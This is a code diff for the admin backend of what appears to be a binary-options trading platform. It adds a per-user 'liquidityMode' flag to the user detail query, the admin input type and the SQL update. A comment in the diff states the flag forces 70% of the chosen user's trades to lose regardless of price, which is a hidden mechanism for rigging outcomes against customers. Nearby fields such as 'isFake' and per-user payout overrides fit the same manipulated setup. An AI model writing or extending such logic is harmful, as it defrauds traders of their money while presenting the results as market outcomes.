@@ -145,6 +145,7 @@ export async function getUserDetail(userId: string) {
     cpf: string | null; phone: string | null; country: string | null; address: string | null
     // Admin-edit-drawer fields (migration 20260526000000_admin_user_edit_fields)
     isFake: boolean; copyTraderEnabled: boolean
+    liquidityMode: boolean
     payoutOverrideForex: number | null; payoutOverrideOtc: number | null; payoutOverrideCrypto: number | null
     canTradeForex: boolean; canTradeOtc: boolean; canTradeCrypto: boolean
     createdAt: Date; updatedAt: Date
@@ -152,7 +153,7 @@ export async function getUserDetail(userId: string) {
     SELECT id, name, email, role::text AS role, "kycStatus"::text AS "kycStatus",
            blocked, "blockedAt", "blockedReason", "twoFactorEnabled",
            nickname, "lastName", "birthDate", cpf, phone, country, address,
-           "isFake", "copyTraderEnabled",
+           "isFake", "copyTraderEnabled", "liquidityMode",
            "payoutOverrideForex", "payoutOverrideOtc", "payoutOverrideCrypto",
            "canTradeForex", "canTradeOtc", "canTradeCrypto",
            "createdAt", "updatedAt"
@@ -236,6 +237,10 @@ export interface UpdateUserAdminInput {
   // Admin toggles
   isFake?:                Boolean
   copyTraderEnabled?:     Boolean
+  // "Liquidez" — force 70% of this user's operations to LOSE regardless
+  // of price. Strictly per-user; only fires when set to true via this
+  // admin endpoint. See operations/worker.ts for the gate.
+  liquidityMode?:         Boolean
   // Per-user payout overrides (null = clear, use asset default)
   payoutOverrideForex?:   number | null
   payoutOverrideOtc?:     number | null
@@ -281,6 +286,7 @@ export async function updateUserByAdmin(
   // Admin toggles
   if (input.isFake             !== undefined) sets.push(Prisma.sql`"isFake" = ${input.isFake}`)
   if (input.copyTraderEnabled  !== undefined) sets.push(Prisma.sql`"copyTraderEnabled" = ${input.copyTraderEnabled}`)
+  if (input.liquidityMode      !== undefined) sets.push(Prisma.sql`"liquidityMode" = ${input.liquidityMode}`)
   // Payout overrides — DB CHECK constraint validates 0-100, NULL allowed.
   if (input.payoutOverrideForex   !== undefined) sets.push(Prisma.sql`"payoutOverrideForex" = ${input.payoutOverrideForex}`)
   if (input.payoutOverrideOtc     !== undefined) sets.push(Prisma.sql`"payoutOverrideOtc" = ${input.payoutOverrideOtc}`)
